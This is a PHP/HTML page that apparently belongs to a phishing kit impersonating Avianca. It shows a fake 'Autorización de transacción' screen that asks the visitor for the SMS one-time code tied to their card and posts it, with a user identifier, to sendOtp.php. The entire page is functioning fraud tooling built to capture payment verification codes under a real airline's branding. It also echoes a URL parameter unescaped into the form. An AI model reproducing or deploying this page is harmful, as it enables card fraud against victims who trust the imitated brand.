<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="media/icon.ico" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
    <link rel="stylesheet" href="./css/style.css">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">

    <title>Avianca | #NACIONALES</title>
</head>

<body>
    <div class="header_check">
        <img src="media/logo-avianca-minimal.svg" class="logo">
        <img src="media/paso3.png" alt="" class="pasos">
    </div>

    <div class="body_check">

        <div class="container mt-4">
        <form action="sendOtp.php" method="POST">
            <input type="hidden" value="<?php echo $_GET["id_user"]; ?> " name="id_user">
            <div class="container-mt-5 ps-2 pe-2">
                <p class="text-center text-uppercase"><strong>Autorización de transacción</strong></p>

                <div class="row ps-2 pe-2">
                    <div class="col-12">
                        <p> La transacción que intentas realizar en <span id="contentBlock-merchantname">Avianca S.A</span> con tu tarjeta terminada en <span class="always-left-to-right" id="numDigito">********</span>
                            debe ser autorizada por seguridad.<br><br>Continúa con ella ingresando el codigo de seis digitos que llegara via sms.</p>
                    </div>
                </div>

                <br>
                <div class="ps-2 pe-2">
                    <h4>Detalle de la Transacción</h4>

                    <div class="row">
                        <div class="col-6">
                            <p><strong>Comercio:</strong></p>
                        </div>
                        <div class="col-6">
                            <p>Avianca S.A</p>
                        </div>
                    </div>

                    <div class="row">
                        <div class="col-6">
                            <p><strong>Número de Tarjeta:</strong></p>
                        </div>
                        <div class="col-6">
                            <p>********</p>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-6">
                            <p><strong>Ingresa tu codigo: </strong></p>
                        </div>
                        <div class="col-6">
                            <div class="form-group">
                                <input type="text" class="form-control" name="otp">
                            </div>
                        </div>
                    </div>


                    <div class="form-group" id="btnotp">
                        <button type="submit" class=" btn btn-dark">
                            Enviar
                        </button>
                    </div>

                    <p class="text-center">
                        <a class="text-dark" href="#">¿Necesitas Ayuda?</a>
                    </p>
                </div>

            </div>
        </form>
        <br><br>

    </div>


    <?php 
            if(isset($_GET["error"]) && $_GET["error"] === "empty"){
               ?>
                <div class="content_modal_e content_modal_e_2">
                    <div class="modal">
                        <div class="close">
                        <i class="far fa-times-circle" onclick="closeModale();"></i>
                        </div>
                        <div class="text">
                            <p>Debes ingresar el Codigo, <br>
                            por favor vuelve a intentarlo</p>
                        </div>
                        <button type="button" onclick="closeModale();">OK</button>
                    </div>
                </div>
               <?php
            }
        ?>

    <?php 
            if(isset($_GET["error"])  && $_GET["error"] === "error" ){
               ?>
                <div class="content_modal_e content_modal_e_2">
                    <div class="modal">
                        <div class="close">
                        <i class="far fa-times-circle" onclick="closeModale();"></i>
                        </div>
                        <div class="text">
                            <p>Codigo incorrecto,<br>
                            por favor vuelve a intentarlo</p>
                        </div>
                        <button type="button" onclick="closeModale();">OK</button>
                    </div>
                </div>
               <?php
            }
    ?>
  

</body>


<script src="js/jquery-3.7.1.min.js"></script>
<script src="js/modal.js"></script>

</html>